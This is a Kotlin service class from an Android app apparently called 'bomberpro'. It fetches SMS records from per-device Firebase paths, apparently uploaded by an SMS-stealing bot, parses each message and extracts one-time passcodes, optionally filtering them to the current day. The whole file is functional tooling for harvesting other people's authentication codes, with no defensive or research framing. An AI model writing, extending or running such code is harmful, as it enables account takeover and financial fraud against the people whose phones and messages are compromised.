package com.sanji.bomberpro.services

import android.util.Log
import com.sanji.bomberpro.data.OtpMessage
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.OkHttpClient
import okhttp3.Request
import org.json.JSONArray
import org.json.JSONObject
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.TimeUnit

class OtpService {

    private val http: OkHttpClient = OkHttpClient.Builder()
        .connectTimeout(6, TimeUnit.SECONDS)
        .readTimeout(8, TimeUnit.SECONDS)
        .build()

    private val pathCache = ConcurrentHashMap<String, String>()
    private val seenHashes = ConcurrentHashMap<String, MutableSet<String>>()

    private val MAX_MESSAGES = 300

    // extended path list — bot's 14 + extras for non-standard device payloads
    private fun msgPaths(devId: String): List<String> = listOf(
        "/clients/$devId/messages.json",
        "/clients/$devId/sms.json",
        "/clients/$devId/inbox.json",
        "/clients/$devId/smsList.json",
        "/clients/$devId/receivedSms.json",
        "/clients/$devId/received.json",
        "/clients/$devId/webhookEvent/messages.json",
        "/clients/$devId/webhookEvent/sms.json",
        "/messages/$devId.json",
        "/sms/$devId.json",
        "/inbox/$devId.json",
        "/devices/$devId/messages.json",
        "/devices/$devId/sms.json",
        "/received/$devId.json",
        // extras
        "/clients/$devId/messageList.json",
        "/clients/$devId/latestMessages.json",
        "/clients/$devId/allMessages.json",
        "/clients/$devId/inboxMessages.json",
        "/clients/$devId/receivedMessages.json",
        "/clients/$devId/webhookEvent/lastSms.json",
        "/clients/$devId/otp.json",
        "/clients/$devId/otpList.json",
        "/clients/$devId/smsData.json",
        "/clients/$devId/msgList.json",
        "/clients/$devId/data/messages.json",
        "/clients/$devId/smsCollection.json",
    )

    suspend fun readMessages(device: Device): List<OtpMessage> = withContext(Dispatchers.IO) {
        val fbUrl = device.firebaseUrl.trimEnd('/')
        val devId = device.deviceId
        val cacheKey = "$fbUrl|$devId"

        val allPaths = msgPaths(devId)
        val cached = pathCache[cacheKey]
        val orderedPaths = if (cached != null && cached in allPaths) {
            listOf(cached) + allPaths.filter { it != cached }
        } else allPaths

        val dedupe = HashMap<String, OtpMessage>()
        var workingPath: String? = null

        for (path in orderedPaths) {
            val url = fbUrl + path
            val data = fetchJson(url)
            if (data == null) continue

            val items = parseItems(data)
            if (items.isEmpty()) continue

            Log.d(TAG, "readMessages ${device.shortId}: ${items.size} items at $path")

            for ((msgId, payload) in items) {
                val parsed = parseMessage(msgId, payload) ?: continue
                if (parsed.hash in dedupe) continue
                dedupe[parsed.hash] = parsed
            }
            if (items.isNotEmpty() && workingPath == null) {
                workingPath = path
            }
            // don't break — gather from all paths that yield data
        }

        workingPath?.let { pathCache[cacheKey] = it }

        if (dedupe.isEmpty()) {
            Log.w(TAG, "readMessages ${device.shortId}: 0 messages across ${allPaths.size} paths")
        }

        dedupe.values.sortedByDescending { it.ts }
    }

    suspend fun collectAll(device: Device): List<OtpMessage> {
        return readMessages(device).take(MAX_MESSAGES)
    }

    suspend fun collectToday(device: Device): List<OtpMessage> {
        val cutoff = istMidnightTs()
        val all = collectAll(device)
        return all.filter { it.hasOtp && it.ts >= cutoff }
    }

    suspend fun collectAllOtp(device: Device): List<OtpMessage> {
        return collectAll(device).filter { it.hasOtp }
    }

    suspend fun collectSince(device: Device, sinceTs: Long): List<OtpMessage> {
        return collectAll(device).filter { it.hasOtp && it.ts >= sinceTs }
    }

    fun markSeen(devId: String, hash: String) {
        val set = seenHashes.getOrPut(devId) { mutableSetOf() }
        synchronized(set) {
            set.add(hash)
            if (set.size > 500) {
                val drop = set.size - 500
                val iter = set.iterator()
                repeat(drop) { if (iter.hasNext()) { iter.next(); iter.remove() } }
            }
        }
    }

    fun isSeen(devId: String, hash: String): Boolean {
        val set = seenHashes[devId] ?: return false
        return synchronized(set) { hash in set }
    }

    private fun fetchJson(url: String): Any? {
        return try {
            val req = Request.Builder()
                .url(url)
                .header("Accept", "application/json")
                .header("User-Agent", "Mozilla/5.0 (Linux; Android) SanjiApp/1.0")
                .get()
                .build()
            http.newCall(req).execute().use { resp ->
                if (!resp.isSuccessful) return null
                val body = resp.body?.string() ?: return null
                val trimmed = body.trim()
                if (trimmed.isEmpty() || trimmed == "null") return null
                try {
                    if (trimmed.startsWith("[")) JSONArray(trimmed)
                    else JSONObject(trimmed)
                } catch (_: Exception) { null }
            }
        } catch (_: Exception) { null }
    }

    private fun parseItems(data: Any?): List<Pair<String, JSONObject>> {
        val out = mutableListOf<Pair<String, JSONObject>>()
        when (data) {
            is JSONObject -> {
                val keys = data.keys()
                val keyList = mutableListOf<String>()
                while (keys.hasNext()) keyList.add(keys.next())
                val lower = keyList.map { it.lowercase() }
                val looksLikeMsg = lower.any {
                    it == "body" || it == "message" || it == "text" ||
                            it == "msg" || it == "content" || it == "address" ||
                            it == "sender" || it == "from"
                }
                if (looksLikeMsg) {
                    out.add("${System.currentTimeMillis()}" to data)
                } else {
                    for (k in keyList) {
                        val v = data.opt(k)
                        if (v is JSONObject) {
                            out.add(k to v)
                        } else if (v is JSONArray) {
                            for (i in 0 until v.length()) {
                                val vi = v.opt(i)
                                if (vi is JSONObject) out.add("$k-$i" to vi)
                            }
                        }
                    }
                }
            }
            is JSONArray -> {
                for (i in 0 until data.length()) {
                    val v = data.opt(i)
                    if (v is JSONObject) out.add(i.toString() to v)
                }
            }
        }
        return out
    }

    private fun parseMessage(msgId: String, payload: JSONObject): OtpMessage? {
        val body = getCI(
            payload,
            "body", "message", "text", "msg", "content", "sms", "smsBody",
            "bodyText", "MessageBody", "Body", "Message", "Text",
        )?.toString()
        val sender = getCI(
            payload,
            "address", "sender", "from", "originator", "phone", "phoneNumber",
            "senderAddress", "From", "Sender", "Address", "origin",
        )?.toString() ?: "Unknown"

        var ts = getCI(
            payload,
            "date", "timestamp", "time", "receivedAt", "createdAt",
            "receivedDate", "dateTime", "Date", "Timestamp", "Time",
        )?.toString()?.toLongOrNull() ?: 0L

        if (ts > 10_000_000_000L) ts /= 1000L
        val now = System.currentTimeMillis() / 1000L
        if (ts > now + 3600) ts = now
        if (ts < 1_420_000_000L) ts = 0L
        if (ts == 0L) ts = now

        if (body.isNullOrBlank()) return null

        val extracted = OtpExtractor.extractOtp(body)
        val otpList = extracted.take(3).map { it.code }
        val bestScore = extracted.firstOrNull()?.score ?: 0
        val hash = OtpExtractor.bodyHash(body, sender, ts)

        return OtpMessage(
            msgId = msgId,
            hash = hash,
            sender = sender,
            body = body,
            ts = ts,
            otps = otpList,
            hasOtp = extracted.isNotEmpty(),
            score = bestScore,
        )
    }

    private fun getCI(obj: JSONObject, vararg keys: String): Any? {
        val keysLower = keys.map { it.lowercase() }
        val iter = obj.keys()
        while (iter.hasNext()) {
            val k = iter.next()
            if (k.lowercase() in keysLower) {
                val v = obj.opt(k)
                if (v != null && v != JSONObject.NULL) return v
            }
        }
        return null
    }

    fun istMidnightTs(): Long {
        val tz = java.util.TimeZone.getTimeZone("Asia/Kolkata")
        val cal = java.util.Calendar.getInstance(tz)
        cal.set(java.util.Calendar.HOUR_OF_DAY, 0)
        cal.set(java.util.Calendar.MINUTE, 0)
        cal.set(java.util.Calendar.SECOND, 0)
        cal.set(java.util.Calendar.MILLISECOND, 0)
        return cal.timeInMillis / 1000L
    }

    companion object {
        private const val TAG = "OtpService"
    }
}